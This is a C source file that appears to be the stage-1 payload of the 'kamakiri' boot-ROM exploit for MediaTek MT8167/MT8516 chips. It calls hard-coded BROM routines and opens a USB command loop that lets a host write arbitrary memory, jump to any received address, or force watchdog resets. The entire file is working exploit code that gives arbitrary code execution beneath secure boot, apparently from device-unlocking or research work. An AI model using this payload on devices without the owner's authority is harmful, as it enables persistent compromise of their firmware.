#include "common.h"

/*
 * MT8167/MT8516 kamakiri-v1 stage 1.
 *
 * Keep this path deliberately close to the proven MT8167 implementation.
 * Kamakiri v1 reaches us through the unchecked if_info[wIndex] dispatch; it
 * does not use the kamakiri2 ptr_send overwrite, so there is no BROM USB
 * function-pointer repair to perform here.
 *
 * Do not use the hardware UART in stage 1.  Its clock/pin mux is not
 * guaranteed at BROM stage and a blocked TX-ready wait makes a successful
 * payload indistinguishable from a failed exploit on the host.
 */

/* BROM helpers used by the upstream kamakiri-mt8167 payload. */
static void (*const brom_send_usb_response)(int, int, int) = (void *)0x6C7D;
static int (*const brom_send_dword)(uint32_t) = (void *)0xD1FF;
static uint32_t (*const brom_recv_dword)(void) = (void *)0xD1CB;
static int (*const brom_recv_data)(void *, uint32_t, uint32_t) = (void *)0xD241;

int main(void) {
    /* Complete the pending control transfer, then announce over USB CDC. */
    brom_send_usb_response(1, 0, 1);
    brom_send_dword(0xA1A2A3A4);

    while (1) {
        uint32_t magic = brom_recv_dword();
        if (magic != 0xf00dd00d) {
            continue;
        }

        switch (brom_recv_dword()) {
        case 0x4000: {
            uint32_t address = brom_recv_dword();
            uint32_t size = brom_recv_dword();
            brom_send_dword(
                brom_recv_data((void *)address, size, 0) == 0
                    ? 0xD0D0D0D0
                    : 0xF0F0F0F0
            );
            break;
        }
        case 0x4001: {
            void (*jump_address)(void) = (void *)brom_recv_dword();
            jump_address();
            break;
        }
        case 0x3000: {
            volatile uint32_t *reg = (volatile uint32_t *)0x10007000;
            reg[8 / 4] = 0x1971;
            reg[0 / 4] = 0x22000014;
            reg[0x14 / 4] = 0x1209;
            while (1) {}
        }
        case 0x3001:
            ((volatile uint32_t *)0x10007000)[8 / 4] = 0x1971;
            break;
        default:
            break;
        }
    }
}
